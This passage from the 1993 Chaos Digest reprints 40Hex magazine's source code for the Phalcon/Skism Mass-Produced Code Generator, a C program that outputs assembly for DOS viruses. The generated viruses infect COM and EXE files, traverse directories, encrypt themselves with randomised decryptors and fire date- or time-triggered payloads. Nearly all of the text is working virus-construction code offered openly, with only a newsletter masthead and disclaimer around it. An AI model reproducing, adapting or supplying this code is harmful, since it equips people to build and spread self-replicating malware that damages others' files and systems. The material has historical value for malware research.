  unsigned infectCOM   : 1;
  unsigned infectEXE   : 1;
  unsigned traverse    : 1;       /* Currently only two types */
  unsigned encrypt     : 1;
  unsigned int24       : 1;
  unsigned CommandCom  : 1;
  unsigned allowzero   : 1;
  unsigned calls_check : 1;
} parameters;

typedef struct {
  char       configfilename[80];
  char       asmfilename[80];
  char       id[3];
  char       virusname[80];
  char       virusnamedelim;
  char       authorname[80];
  char       authornamedelim;
  unsigned   minsize, maxsize;
  char       maxinfect;
  parameters p;
  char       xor_value;
  char       xor_comment[40];
  char       activation;
  activation_conditions activate, plusminus;
} globals;

/* prototypes from vmain.c */
void print(char *s, char *t);
void printlabel(char *s, char *t);
void addvar(char *s, char *t, char *u);
void printblank(void);

/* prototypes from vheap.c */
void addheap(char *s, char *t, char *u);
void _addheap(char *s);
void resetheap(void);

/* code generating prototypes */
void code_header(void);
void code_encryption(void);
void code_setup(void);
void code_traversal(void);
void code_check_activation(void);
void code_return(void);
void code_activate(void);
void code_messages(void);
void code_check(void);
void code_infect(void);
void code_subroutines(void);
void code_variables(void);
void code_heap(void);
void code_tail(void);

#ifndef MAIN
extern globals config;
#endif

#endif /* __VHEADER_H */
----------------------------------- Cut Here --------------------------------
/* FILE: VACTIVE.C */
#include "vheader.h"

void code_activate(void)
{
  if (config.activation)
  {
    printlabel("activate:","Conditions satisfied");
    printlabel("; Insert your activation code here","");
    print("jmp  exit_virus","");
    printblank();
  }
}
----------------------------------- Cut Here --------------------------------
/* FILE: VCACTIVE.C */
#include "vheader.h"

void code_get_date(void);
void code_get_time(void);
void code_jmp(char c);

char coded_date, coded_time, Activation;

void code_check_activation(void)
{
  char b[80];

  coded_date = coded_time = 0;
  Activation = config.activation;

  if (config.activate.always)
    printlabel("jmp  activate","Always activate");
  else {
    if (config.activate.month) {
      code_get_date();
      sprintf(b,"cmp  dh,%d",config.activate.month);
      print(b,"Check month");
      code_jmp(config.plusminus.month);
    }
    if (config.activate.day) {
      code_get_date();
      sprintf(b,"cmp  dl,%d",config.activate.day);
      print(b,"Check date");
      code_jmp(config.plusminus.day);
    }
    if (config.activate.year) {
      code_get_date();
      sprintf(b,"cmp  cx,%u",config.activate.year);
      print(b,"Check year");
      code_jmp(config.plusminus.year);
    }
    if (config.activate.dow != 255) {
      code_get_date();
      sprintf(b,"cmp  al,%d",config.activate.dow);
      print(b,"Check date of week");
      code_jmp(config.plusminus.dow);
    }
    if (config.activate.monthday) {
      code_get_date();
      sprintf(b,"cmp  dx,0%xuh",config.activate.monthday);
      print(b,"Check month/date");
      code_jmp(config.plusminus.monthday);
    }

    if (coded_date) printblank();

    if (config.activate.hour != 255) {
      code_get_time();
      sprintf(b,"cmp  ch,%d",config.activate.hour);
      print(b,"Check the hour");
      code_jmp(config.plusminus.hour);
    }
    if (config.activate.minute != 255) {
      code_get_time();
      sprintf(b,"cmp  cl,%d",config.activate.minute);
      print(b,"Check the minute");
      code_jmp(config.plusminus.minute);
    }
    if (config.activate.second != 255) {
      code_get_time();
      sprintf(b,"cmp  dh,%d",config.activate.second);
      print(b,"Check the seconds");
      code_jmp(config.plusminus.second);
    }
    if (config.activate.percentage) {
      code_get_time();
      sprintf(b,"cmp  dl,%d",config.activate.percentage);
      print(b,"Check the percentage");
      code_jmp(-1);

    if (coded_time) printblank();
    }
  }
}

void code_jmp(char c)
{
  if (--Activation) {
    if (c == 1)
      print("jb   exit_virus","");
    else if (c == 0)
      print("jnz  exit_virus","");
    else if (c == 255)
      print("ja   exit_virus","");
  } else {
    if (c == 1)
      print("jae  config.activate","");
    else if (c == 0)
      print("jz   config.activate","");
    else if (c == 255)
      print("jbe  config.activate","");
  }
}

void code_get_date(void)
{
  if (!coded_date) {
    print("mov  ah,2ah","Get current date");
    print("int  21h","");
    coded_date++;
  }
}

void code_get_time(void)
{
  if (!coded_time) {
    print("mov  ah,2ch","Get current time");
    print("int  21h","");
    coded_time++;
  }
}
----------------------------------- Cut Here --------------------------------
/* FILE: VCHECK.C */
#include "vheader.h"

void checkCOM(void);

void code_check(void)
{
  if (config.p.calls_check)
    printlabel("infect_mask:","");
  print("mov  ah,4eh","find first file");
  print("mov  cx,7","any attribute");
  printlabel("findfirstnext:","");
  print("int  21h","DS:DX points to mask");
  if (config.p.calls_check)
    print("jc   exit_infect_mask","No mo files found");
  else
    print("jc   done_infections","No mo files found");
  printblank();
  print("mov  al,0h","Open read only");
  print("call open","");
  printblank();
  print("mov  ah,3fh","Read file to buffer");
  print("lea  dx,[bp+buffer]","@ DS:DX");
  print("mov  cx,1Ah","1Ah bytes");
  print("int  21h","");
  printblank();
  print("mov  ah,3eh","Close file");
  print("int  21h","");
  printblank();
  if (config.p.infectEXE) {
    if (config.p.infectCOM) {
      print("cmp  word ptr [bp+buffer],'ZM'","EXE?");
      print("jz   checkEXE","Why yes, yes it is!");
      checkCOM();
    }
    printlabel("checkEXE: cmp  word ptr [bp+buffer+10h],id","is it already
infected?");
    print("jnz  infect_exe","");
  } else
    checkCOM();
  printlabel("find_next:","");
  print("mov  ah,4fh","find next file");
  print("jmp  short findfirstnext","");
  if (config.p.calls_check) {
    printlabel("exit_infect_mask: ret","");
    printblank();
  }
}

void checkCOM(void)
{
  char s[80];

  printlabel("checkCOM:","");
  if (!config.p.CommandCom)
  {
    print("mov  ax,word ptr [bp+newDTA+35]","Get tail of filename");
    print("cmp  ax,'DN'","Ends in ND? (commaND)");
    print("jz   find_next","");
    printblank();
  }
  print("mov  ax,word ptr [bp+newDTA+1Ah]","Filesize in DTA");
  if (config.minsize)
  {
    if (config.minsize == 1) /* automatic calculation */
      if (config.p.encrypt)
        strcpy(s,"cmp  ax,(heap-decrypt)");
      else
        strcpy(s,"cmp  ax,(heap-startvirus)");
    else  /* if (minsize != 1) */
      sprintf(s,"cmp  ax,%u",config.minsize);
    print(s,"Is it too small?");
    print("jb   find_next","");
    printblank();
  }
  if (config.maxsize)
  {
    if (config.maxsize == 1) /* automatic calculation */
      if (config.p.encrypt)
        strcpy(s,"cmp  ax,65535-(endheap-decrypt)");
      else
        strcpy(s,"cmp  ax,65535-(endheap-startvirus)");
    else
      sprintf(s,"cmp  ax,%u",config.maxsize);
    print(s,"Is it too large?");
    print("ja   find_next","");
    printblank();
  }

  print("mov  bx,word ptr [bp+buffer+1]","get jmp location");
  if (config.p.encrypt)
    print("add  bx,heap-decrypt+3","Adjust for virus size");
  else
    print("add  bx,heap-startvirus+3","Adjust for virus size");
  print("cmp  ax,bx","");
  print("je   find_next","already infected");
  print("jmp  infect_com","");
}
----------------------------------- Cut Here --------------------------------
/* VENCRYPT.C */
#include 

#include "vheader.h"

void code_loop_count(void);
void code_loop_start(void);
void code_decrypt_code(void);

char mem_counter;
char mem_registers[4][3] = {
  "bx",
  "bp",
  "si",
  "di"
};

char loop_counter;
char loop_registers[7][3] = {
  "ax", "bx", "cx", "dx", "bp", "si", "di"
};

char xor_registers[4][2] = {
  { 0x81, 0x37 },
  { 0x81, 0x76 },
  { 0x81, 0x34 },
  { 0x81, 0x35 }
};

char add_registers[4][2] = {
    { 0x81, 0x07 }, /* add [bx],xxxx / db 81h, 7h,xxh,xxh    */
    { 0x81, 0x46 }, /* add [bp],xxxx / db 81h,46h,00,xxh,xxh */
    { 0x81, 0x04 },
    { 0x81, 0x05 },
};

void code_encryption(void)
{
  if (config.p.encrypt) {
    srand(peek(0,0x46C));
    printlabel("decrypt:","handles encryption and decryption");
    if ((loop_counter = random(10)) > 6)   /* if out of bounds */
      loop_counter = 2;                    /* set it = to cx   */
    while (1) {
      mem_counter = random(4);
      if (strcmp(mem_registers[mem_counter = random(4)],
        loop_registers[loop_counter]))
        break;
    }
    if (random(2)) {
      code_loop_count();
      code_loop_start();
    } else {
      code_loop_start();
      code_loop_count();
    }
    code_decrypt_code();
  }
}

void code_loop_count(void)
{
  char b[80];
  sprintf(b,"mov  %s,(offset heap - offset startencrypt)/2",
          loop_registers[loop_counter]);
  print(b,"iterations");
}

void code_loop_start(void)
{
  char b[80];
  printlabel("patch_startencrypt:","");
  sprintf(b,"mov  %s,offset startencrypt",
          mem_registers[mem_counter]);
  print(b,"start of decryption");
}

void code_decrypt_code(void)
{
  char b[80],c[80];
  printlabel("decrypt_loop:","");
  config.xor_value = 0;
  switch (random(2))
  {
    case 0 : sprintf(b,"db   %s%2.2xh,%2.2xh%s",
             (config.p.infectEXE) ? "2eh," : "",
xor_registers[mem_counter][0],
             xor_registers[mem_counter][1],(mem_counter == 1) ? ",0":"");

             sprintf(c,"xor word ptr %s[%s], xxxx",
             (config.p.infectEXE) ? "cs:" : "",mem_registers[mem_counter]);
             break;
    case 1 : sprintf(b,"db   %s%2.2xh,%2.2xh%s",
             (config.p.infectEXE) ? "2eh," : "",
add_registers[mem_counter][0],
             add_registers[mem_counter][1],(mem_counter == 1) ? ",0":"");

             sprintf(c,"add word ptr %s[%s], xxxx",
             (config.p.infectEXE) ? "cs:" : "",mem_registers[mem_counter]);
             config.xor_value = 0x28;
             strcpy(config.xor_comment,"flip between add/sub");
             break;
  }
  print(b,c);
  printlabel("decrypt_value dw 0","initialised at zero for null effect");
  sprintf(c,"inc  %s",mem_registers[mem_counter]);
  print(c,"calculate new decryption location");
  print(c,"");
  if (loop_counter - 2)
  {
    sprintf(b,"dec  %s",loop_registers[loop_counter]);
    print(b,"If we are not done, then");
    print("jnz  decrypt_loop","decrypt mo'");
  } else
    print("loop decrypt_loop","decrypt mo'");
  printlabel("startencrypt:","");
}
----------------------------------- Cut Here --------------------------------

------------------------------

End of Chaos Digest #1.64
************************************

Chaos Digest              Jeudi 1er Juillet 1993        Volume 1 : Numero 65
                              ISSN 1244-4901

       Editeur: Jean-Bernard Condat (jbcondat@attmail.com)
       Archiviste: Yves-Marie Crabbe
       Co-Redacteurs: Arnaud Bigare, Stephane Briere

TABLE DES MATIERES, #1.65 (1er Juillet 1993)
File 1--40H VMag Number 8 Volume 2 Issue 4 #001(2) (reprint)

Chaos Digest is a weekly electronic journal/newsletter. Subscriptions are
available at no cost by sending a message to:
                linux-activists-request@niksula.hut.fi
with a mail header or first line containing the following informations:
                    X-Mn-Admin: join CHAOS_DIGEST

The editors may be contacted by voice (+33 1 47874083), fax (+33 1 47877070)
or S-mail at: Jean-Bernard Condat, Chaos Computer Club France [CCCF], B.P.
155, 93404 St-Ouen Cedex, France.  He is a member of the EICAR and EFF (#1299)
groups.

Issues of ChaosD can also be found from the ComNet in Luxembourg BBS (+352)
466893.  Back issues of ChaosD can be found on the Internet as part of the
Computer underground Digest archives. They're accessible using anonymous FTP:

        * kragar.eff.org [192.88.144.4] in /pub/cud/chaos
        * uglymouse.css.itd.umich.edu [141.211.182.53] in /pub/CuD/chaos
        * halcyon.com [192.135.191.2] in /pub/mirror/cud/chaos
        * ftp.cic.net [192.131.22.2] in /e-serials/alphabetic/c/chaos-digest
        * cs.ubc.ca [137.82.8.5] in /mirror3/EFF/cud/chaos
        * ftp.ee.mu.oz.au [128.250.77.2] in /pub/text/CuD/chaos
        * nic.funet.fi [128.214.6.100] in /pub/doc/cud/chaos
        * orchid.csv.warwick.ac.uk [137.205.192.5] in /pub/cud/chaos

CHAOS DIGEST is an open forum dedicated to sharing French information among
computerists and to the presentation and debate of diverse views. ChaosD
material may be reprinted for non-profit as long as the source is cited.
Some authors do copyright their material, and they should be contacted for
reprint permission.  Readers are encouraged to submit reasoned articles in
French, English or German languages relating to computer culture and
telecommunications.  Articles are preferred to short responses.  Please
avoid quoting previous posts unless absolutely necessary.

DISCLAIMER: The views represented herein do not necessarily represent
            the views of the moderators. Chaos Digest contributors
            assume all responsibility for ensuring that articles
            submitted do not violate copyright protections.

----------------------------------------------------------------------

Date: Tue May 11 09:24:40 PDT 1993
From: 0005847161@mcimail.com (American_Eagle_Publication_Inc. )
Subject: File 1--40H VMag Number 8 Volume 2 Issue 4 #001(2) (reprint)


/* FILE: VHEADER.C */
#include "vheader.h"

void code_header(void)
{
  char b[80];
  sprintf(b,"; %s : %s by %s",config.asmfilename,
         (config.virusname[0]) ? config.virusname : "Unknown",
         (config.authorname[0])? config.authorname: "Unknown");
  printlabel(b,"");
  printlabel("; Created wik the Phalcon/Skism Mass-Produced Code
Generator","");
  sprintf(b,"; from the configuration file %s",config.configfilename);
  printlabel(b,"");
  printblank();
  printlabel(".model tiny","Handy directive");
  printlabel(".code","Virus code segment");
  print("org    100h","COM file starting IP\n");
  if (config.p.infectEXE)
  {
    sprintf(b,"id = '%s'",config.id);
    printlabel(b,"ID word for EXE infections");
  }
  if (config.p.infectCOM)
    if (config.p.encrypt)
      printlabel("entry_point: db 0e9h,0,0","jmp decrypt");
    else
      printlabel("entry_point: db 0e9h,0,0","jmp startvirus");
  printblank();
}
----------------------------------- Cut Here --------------------------------
/* FILE: VHEAP.C */
#include "vheader.h"

char heap[30][80];
char max;

void code_heap(void)
{
  printlabel("heap:","Variables not in code");
  if (max)
    while (max--)
      printlabel(heap[max],"");
  else
    printlabel("; No heap to speak of","");
  printlabel("endheap:","End of virus");
}

void addheap(char *s, char *t, char *u)
{
  if (*u)
    sprintf(heap[max++],"%-20.20s%-20.20s; %-37.37s",s,t,u);
  else
    sprintf(heap[max++],"%-20.20s%s",s,t);
}

void _addheap(char *s)
{
  strcpy(heap[max++],s);
}

void resetheap(void)
{
    max=0;
}
----------------------------------- Cut Here --------------------------------
/* FILE: VINFECT.C */
#include "vheader.h"

void write_encrypt(void);
void code_infect_EXE(void);

void code_infect(void)
{
  if (config.p.infectEXE) {
    printlabel("infect_exe:","");
    code_infect_EXE();
    if (config.p.infectCOM)
      print("jmp  short finishinfection","");
  }
  if (config.p.infectCOM) {
    printlabel("infect_com:","ax = filesize");
    print("mov  cx,3","");
    print("sub  ax,cx","");
    print("lea  si,[bp+offset buffer]","");
    print("lea  di,[bp+offset save3]","");
    print("movsw","");
    print("movsb","");
    print("mov  byte ptr [si-3],0e9h","");
    print("mov  word ptr [si-2],ax","");
    if (config.p.encrypt)
    {
      print("add  ax,103h","");
      print("push ax","needed later");
    }
  }
  printlabel("finishinfection:","");
  print("push cx","Save # bytes to write");
  print("xor  cx,cx","Clear attributes");
  print("call attributes","Set file attributes");
  printblank();
  print("mov  al,2","");
  print("call open","");
  printblank();
  print("mov  ah,40h","Write to file");
  print("lea  dx,[bp+buffer]","Write from buffer");
  print("pop  cx","cx bytes");
  print("int  21h","");
  printblank();
  print("mov  ax,4202h","Move file pointer");
  print("xor  cx,cx","to end of file");
  print("cwd","xor dx,dx");
  print("int  21h","");
  printblank();
  if (config.p.encrypt) {
    write_encrypt();
  } else {
    print("mov  ah,40h","Concatenate virus");
    print("lea  dx,[bp+startvirus]","");
    print("mov  cx,heap-startvirus","# bytes to write");
    print("int  21h","");
    printblank();
  }
  print("mov  ax,5701h","Restore creation date/time");
  print("mov  cx,word ptr [bp+newDTA+16h]","time");
  print("mov  dx,word ptr [bp+newDTA+18h]","date");
  print("int  21h","");
  printblank();
  print("mov  ah,3eh","Close file");
  print("int  21h","");
  printblank();
  print("mov ch,0","");
  print("mov cl,byte ptr [bp+newDTA+15h]","Restore original");
  print("call attributes","attributes");
  printblank();
  if (config.maxinfect)
  {
    print("dec  byte ptr [bp+numinfec]","One mo infection");
    print("jnz  mo_infections","Not enough");
    if (config.p.calls_check)
      print("pop  ax","remove call from stack");
    print("jmp  done_infections","");
  }
  printlabel("mo_infections: jmp find_next","");
  printblank();
}

void write_encrypt(void)
{
  if (!config.p.allowzero)
    printlabel("get_encrypt_value:","");
  print("mov  ah,2ch","Get current time");
  print("int  21h","dh=sec,dl=1/100 sec");
  if (!config.p.allowzero) {
    print("or  dx,dx","Check if encryption value = 0");
    print("jz  get_encrypt_value","Get another if it is");
  }
  print("mov  [bp+decrypt_value],dx","Set new encryption value");
  addheap("code_store:","db (startencrypt-decrypt)*2+(endwrite-write)+1 dup
(?)","");
 _addheap("; The following code is the buffer for the write function");
  print("lea  di,[bp+code_store]","");
  print("mov  ax,5355h","push bp,push bx");
  print("stosw","");
  print("lea  si,[bp+decrypt]","Copy encryption function");
  print("mov  cx,startencrypt-decrypt","Bytes to move");
  print("push si","Save for later use");
  print("push cx","");
  print("rep  movsb","");
  printblank();
  if (config.xor_value)
  {
    char b[80];
    sprintf(b,"xor  byte ptr [bp+decrypt_loop+%c],0%2.2xh",
           (config.p.infectEXE) ? '2' : '1', config.xor_value);
    print(b,config.xor_comment);
    printblank();
  }
  print("lea    si,[bp+write]","Copy writing function");
  print("mov    cx,endwrite-write","Bytes to move");
  print("rep    movsb","");
  print("pop    cx","");
  print("pop    si","");

  print("pop    dx","Entry point of virus");

  print("push   di","");
  print("push   si","");
  print("push   cx","");
  print("rep    movsb","Copy decryption function");
  print("mov    ax,5b5dh","pop bx,pop bp");
  print("stosw","");
  print("mov    al,0c3h","retn");
  print("stosb","");
  printblank();
  print("add    dx,offset startencrypt - offset decrypt","Calculate new");
  print("mov    word ptr [bp+patch_startencrypt+1],dx","starting offset of");
  print("call   code_store","decryption");
  print("pop    cx","");
  print("pop    di","");
  print("pop    si","");
  print("rep    movsb","Restore decryption function");
  printblank();
}

void code_infect_EXE(void)
{
  print("les  ax, dword ptr [bp+buffer+14h]","Save old entry point");
  print("mov  word ptr [bp+jmpsave2], ax","");
  print("mov  word ptr [bp+jmpsave2+2], es","");
  printblank();
  print("les  ax, dword ptr [bp+buffer+0Eh]","Save old stack");
  print("mov  word ptr [bp+stacksave2], es","");
  print("mov  word ptr [bp+stacksave2+2], ax","");
  printblank();
  print("mov  ax, word ptr [bp+buffer + 8]","Get header size");
  print("mov  cl, 4","convert to bytes");
  print("shl  ax, cl","");
  print("xchg ax, bx","");
  printblank();
  print("les  ax, [bp+offset newDTA+26]","Get file size");
  print("mov  dx, es","to DX:AX");
  print("push ax","");
  print("push dx","");
  printblank();
  print("sub  ax, bx","Subtract header size from");
  print("sbb  dx, 0","file size");
  printblank();
  print("mov  cx, 10h","Convert to segment:offset");
  print("div  cx","form");
  printblank();
  print("mov  word ptr [bp+buffer+14h], dx","New entry point");
  print("mov  word ptr [bp+buffer+16h], ax","");
  printblank();
  print("mov  word ptr [bp+buffer+0Eh], ax","and stack");
  print("mov  word ptr [bp+buffer+10h], id","");
  printblank();
  print("pop  dx","get file length");
  print("pop  ax","");
  printblank();
  if (config.p.encrypt)
    print("add  ax, heap-decrypt","add virus size");
  else
    print("add  ax, heap-startvirus","add virus size");
  print("adc  dx, 0","");
  printblank();
  print("mov  cl, 9","");
  print("push ax","");
  print("shr  ax, cl","");
  print("ror  dx, cl","");
  print("stc","");
  print("adc  dx, ax","");
  print("pop  ax","");
  print("and  ah, 1","mod 512");
  printblank();
  print("mov  word ptr [bp+buffer+4], dx","new file size");
  print("mov  word ptr [bp+buffer+2], ax","");
  printblank();
  print("push cs","restore ES");
  print("pop  es","");
  printblank();
  if (config.p.encrypt)
    print("push word ptr [bp+buffer+14h]","needed later");
  print("mov  cx, 1ah","");
}
----------------------------------- Cut Here --------------------------------
/* FILE: VMAIN.C */
/* The Phalcon/Skism Mass-Produced Code Generator *
 * Version 0.90a - 27 Jul 92 - Initial Release    *
 * Written by Dark Angel of Phalcon/Skism         *
 * Source code released with 40Hex-8              *
 */

#include 

#define MAIN
#include "vheader.h"
#undef MAIN

globals config;

void parse_config(void);
unsigned getnumber(int line, char *d, char ok, char *next);
char getyn(int line, char *d);
void setplusminus(char *a, char b);
void parseactivate(int line, char *d, char min, char max, char *a, char
*b,char *s);
void printerror(int line, char c);
void getDBname(char *orig, char *name,char *delim);

FILE *fp;

void main(int argc, char **argv)
{
  char c,filename[80];

  puts("PS-MPC ~ Phalcon/Skism Mass Produced Code Generator");
  puts("       ~ Version 0.90a        Written by Dark Angel\n");

  if (argc < 2)
  {
    puts("Syntax: PS-MPC   ...");
    puts("  file1 = name of first configuration file");
    puts("  file2 = name of second configuration file");
  }

  for (c=1;c 40)
        fputc(' ',fp);
      fprintf(fp,"; %s",t);
    } else /* if (*t) */
      fprintf(fp,s);
  fprintf(fp,"\n");
}

void addvar(char *s, char *t, char *u)
{
  char b[80];
  if (*u)
    sprintf(b,"%-20.20s%-20.20s; %s",s,t,u);
  else
    sprintf(b,"%-20.20s%s",s,t);
  printlabel(b,"");
}

void parse_config(void)
{
    char b[80];
    char *c, *d;
    int  line = 0;
    globals default_globals = {
        "",                       /* Configuration file name              */
        "",                       /* Source code file name                */
        "  ",                     /* EXE ID Word                          */
        "",                       /* Virus name                           */
        '\'',                     /* Deliminator for virus name           */
        "",                       /* Author name                          */
        '\'',                     /* Deliminator for author name          */
        0,                        /* Minimum COM size for infection       */
        0,                        /* Maximum COM size for infection       */
        0,                        /* Infections per run                   */
        { 0,0,NONE,0,0,0,0 },     /* flags                                */
        0,                        /* xor value                            */
        "",                       /* xor comment                          */
        0,                        /* number of activation conditions      */
        { 0,0,0,0,0,-1,0,-1,-1,-1,0 }, /* activation conditions           */
        { 0,0,0,0,0, 0,0, 0, 0, 0,-1}  /* plusminus activation conditions */
    };

    config = default_globals;

    while (1)
    {
        line++;
        b[0]=0;
        c = fgets(b,100,fp);
        if (!b[0])
          break;
        while (isspace(*c)) c++;    /* skip initial spaces */
        if (!*c || *c == ';') continue;    // check if this line is a comment
        d = c;
        while (!isspace(*d)) d++;   /* isolate one word  */
        *d++ = 0;                   /* NULL terminate it */
        while (isspace(*d) || (*d == '=')) d++;

        if (!stricmp(c,"filename"))
        {
          c = d;
          while (!isspace(*d)) d++; /* isolate filename */
          *d = 0;
          strcpy(config.asmfilename,c);
        }

        else if (!stricmp(c,"traversal"))
          switch (toupper(*d))
          {
            case 'N' : config.p.traverse = NONE; break;
            case 'D' : config.p.traverse = DOT_DOT; break;
            default  : printerror(line,*d);
          }

        else if (!stricmp(c,"encryption")) config.p.encrypt = getyn(line,d);

        else if (!stricmp(c,"infect")) {
          while (!isspace(*d)) {
            switch (toupper(*d))
            {
              case 'C' : config.p.infectCOM = 1; break;
              case 'E' : config.p.infectEXE = 1; break;
              case ',' : break;
              default  : printerror(line,*d);
            }
            d++;
          }
        }

        else if (!stricmp(c,"idword")) {
          config.id[0] = (isspace(*d)) ? ' ' : *d;
          config.id[1] = (isspace(*(d+1))) ? ' ' : *(d+1);
          config.id[2]=0;
        }

        else if (!stricmp(c,"minsize")) {
          if (toupper(*d) == 'A')
            config.minsize = 1;
          else {
            config.minsize = getnumber(line,d,0,0);
            if (config.maxsize > 1)
              if (config.minsize > config.maxsize)
                puts("Error: minsize is greater than maxsize!");
          }
        }

        else if (!stricmp(c,"maxsize")) {
          if (toupper(*d) == 'A')
            config.maxsize = 1;
          else {
            config.maxsize = getnumber(line,d,0,0);
            if (config.minsize > 1)
              if (config.maxsize < config.minsize)
                printf("Error: minsize is greater than maxsize!\n");
          }
        }

        else if (!stricmp(c,"infections"))
          config.maxinfect = (unsigned char)getnumber(line,d,0,0);

        else if (!stricmp(c,"errorhandler"))
          config.p.int24 = getyn(line,d);

        else if (!stricmp(c,"commandcom"))
          config.p.CommandCom = getyn(line,d);

        else if (!stricmp(c,"virusname"))
          getDBname(d,config.virusname,&config.virusnamedelim);

        else if (!stricmp(c,"authorname"))
          getDBname(d,config.authorname,&config.authornamedelim);

        else if (!stricmp(c,"allowzero"))
          config.p.allowzero = getyn(line,d);

        else if (!stricmp(c,"always")) {
          config.activate.always = getyn(line,d);
          if (config.activate.always) config.activation++;
        }

        else if (!stricmp(c,"ifmonth"))

parseactivate(line,d,1,12,&config.activate.month,&config.plusminus.month,"mont
h");

        else if (!stricmp(c,"ifday"))

parseactivate(line,d,1,31,&config.activate.day,&config.plusminus.day,"day");

        else if (!stricmp(c,"ifyear"))
        {
          config.activate.year = getnumber(line,d,'+',d);
          setplusminus((char *)&config.plusminus.year,*d);
          config.activation++;
        }

        else if (!stricmp(c,"ifdow"))

parseactivate(line,d,0,6,&config.activate.dow,&config.plusminus.dow,"date of
week");

        else if (!stricmp(c,"ifmonthday"))
        {
          int  tempint;
          char temp=(char)getnumber(line,d,',',d);
          if ((temp < 1) || (temp > 12))
            printf("Invalid month: %d.  Must range between 1 and 12.\n",temp);
          else {
            d++;
            tempint = temp*0x100;
            temp=(char)getnumber(line,d,'+',d);
            if ((temp < 1) || (temp > 31))
            {
              printf("Invalid day: %d.  Must range between 1 and 31.\n",temp);
            } else {
              config.activate.monthday=tempint + temp;
              setplusminus((char *)&config.plusminus.monthday,*d);
              config.activation++;
            }
          }
        }

        else if (!stricmp(c,"ifhour"))

parseactivate(line,d,0,23,&config.activate.hour,&config.plusminus.hour,"hour")
;

        else if (!stricmp(c,"ifminute"))

parseactivate(line,d,0,59,&config.activate.minute,&config.plusminus.minute,"mi
nute");

        else if (!stricmp(c,"ifsecond"))

parseactivate(line,d,0,59,&config.activate.second,&config.plusminus.second,"se
cond");

        else if (!stricmp(c,"percentage"))

parseactivate(line,d,1,99,&config.activate.percentage,0,"percentage");

        else if (!isspace(c))
          printf("Error in line %d: Invalid parameter '%s'.\n",line,c);
    }
}

unsigned int getnumber(int line,char *d,char ok,char *next)
{
  int temp = 0;
  while (isdigit(*d))
  {
    temp*=10;
    temp+=(*d-'0');
    d++;
  }
  if ((ok == '+') && (!((*d == '+') || (*d == '-'))) && !isspace(*d))
    printerror(line,*d);
  else
    if (next) *next=*d;
  return temp;
}

char getyn(int line,char *d)
{
  switch (toupper(*d))
  {
    case 'Y' : return 1;
    case 'N' : return 0;
    default  : printerror(line,*d);
  }
  return 0;
}

void setplusminus(char *a, char b)
{
    if (b == '+')
      *a = 1;
    else if (b == '-')
      *a = -1;
    else
      *a = 0;
}

void parseactivate(int line, char *d, char min, char max, char *a, char *b,
char *s)
{
  char *c=d;
  char temp = (char)getnumber(line,d,'+',c);
  if ((temp < min) || (temp > max))
    printf("Invalid %s specified: %d.  Range must be between %d &
%d.\n",s,temp,min,max);
  else {
    *a = temp;
    if (b != 0) setplusminus(b,*c);
    config.activation++;
  }
}

void printerror(int line, char c)
{
  printf("Error in line %d: Invalid character '%c'.\n",line,c);
}

void printblank(void)
{
  fprintf(fp,"\n");
}
void getDBname(char *orig, char *name,char *delim)
{
  *delim = '\'';
  orig[strlen(orig)-1] = 0;
  if (strchr(orig,'\''))
    if (strchr(orig,'\"')) {
      *delim = 0;
      printf("Error in %s: Both single and double quotes used.",orig);
    }
    else
      *delim = '\"';
  if (*delim)
    strcpy(name,orig);
}
----------------------------------- Cut Here --------------------------------
/* FILE: VMESSAGE.C */
#include "vheader.h"

void code_messages(void)
{
    char b[80];
    addvar("creator","db '[MPC]',0","Mass Produced Code Generator");
    if (config.virusname[0]) {
      sprintf(b,"db %c%s%c,0",config.virusnamedelim, config.virusname,
                              config.virusnamedelim);
      addvar("virusname",b,"");
    }
    if (config.authorname[0]) {
      sprintf(b,"db %c%s%c,0",config.authornamedelim, config.authorname,
                              config.authornamedelim);
      addvar("author",b,"");
    }
    printblank();
}
----------------------------------- Cut Here --------------------------------
/* FILE: VRETURN.C */
#include "vheader.h"

void return_EXE(void);
void return_COM(void);

void code_return(void)
{
  char s[80];
  if (config.activation)
    printlabel("exit_virus:","");
  if (config.p.int24)
  {
    print("mov  ax,2524h","Restore int 24 handler");
    print("lds  dx,[bp+offset oldint24]","to original");
    print("int  21h","");
    print("push cs","");
    print("pop  ds","");
    printblank();
  }
  if (config.p.traverse == DOT_DOT) {
    print("mov  ah,3bh","change directory");
    print("lea  dx,[bp+origdir-1]","original directory");
    print("int  21h","");
    printblank();
  }
  print("mov  ah,1ah","restore DTA to default");
  print("mov  dx,80h","DTA in PSP");
  if (config.p.infectEXE)
  {
    if (config.p.infectCOM)
    {
      print("cmp  sp,id-4","EXE or COM?");
      print("jz   returnEXE","");
      printlabel("returnCOM:","");
      return_COM();
      printlabel("returnEXE:","");
      return_EXE();
    } else /* EXE only */
    {
      return_EXE();
    }
  } else
  {
    return_COM();
    addvar("save3","db 0cdh,20h,0","First 3 bytes of COM file");
  }
  printblank();
}

void return_EXE(void)
{
  print("pop  es","");
  print("pop  ds","");
  print("int  21h","");
  print("mov  ax,es","AX = PSP segment");
  print("add  ax,10h","Adjust for PSP");
  print("add  word ptr cs:[bp+jmpsave+2],ax","");
  print("add  ax,word ptr cs:[bp+stacksave+2]","");
  print("cli","Clear intrpts for stack manipulation");
  print("mov  sp,word ptr cs:[bp+stacksave]","");
  print("mov  ss,ax","");
  print("sti","");
  print("db   0eah","jmp ssss:oooo");
  addvar("jmpsave","dd ?","Original CS:IP");
  addvar("stacksave","dd ?","Original SS:SP");
  if (config.p.infectCOM) {
    addvar("jmpsave2","db ?","Actually four bytes");
    addvar("save3","db 0cdh,20h,0","First 3 bytes of COM file");
  } else
    addvar("jmpsave2","dd 0fff00000h","Needed for carrier file");
  addvar("stacksave2","dd ?","");
}

void return_COM(void)
{
  print("int  21h","");
  print("retn","100h is on stack");
}
----------------------------------- Cut Here --------------------------------
/* FILE: VSETUP.C */
#include "vheader.h"

void restore_COM(void);
void restore_EXE(void);

void code_setup(void)
{
  addheap("buffer","db 1ah dup (?)","read buffer");
  if (!config.p.encrypt)
    printlabel("startvirus:","virus code starts here");
  print("call next","calculate delta offset");
  printlabel("next:     pop  bp","bp = IP next");
  print("sub  bp,offset next","bp = delta offset");
  printblank();
  if (config.p.infectEXE)
  {
    if (config.p.infectCOM) /* COM & EXE */
    {
      print("cmp  sp,id","COM or EXE?");
      print("je   restoreEXE","");
      printlabel("restoreCOM:","");
      restore_COM();
      print("jmp  short restoreEXIT","");
      printlabel("restoreEXE:","");
      restore_EXE();
      printlabel("restoreEXIT:","");
      print("movsw","");
    } else /* EXE ONLY */
      restore_EXE();
  } else
    restore_COM();

  printblank();
  if (config.maxinfect)
  {
    char b[80];
    addheap("numinfec","db ?","Infections this run");
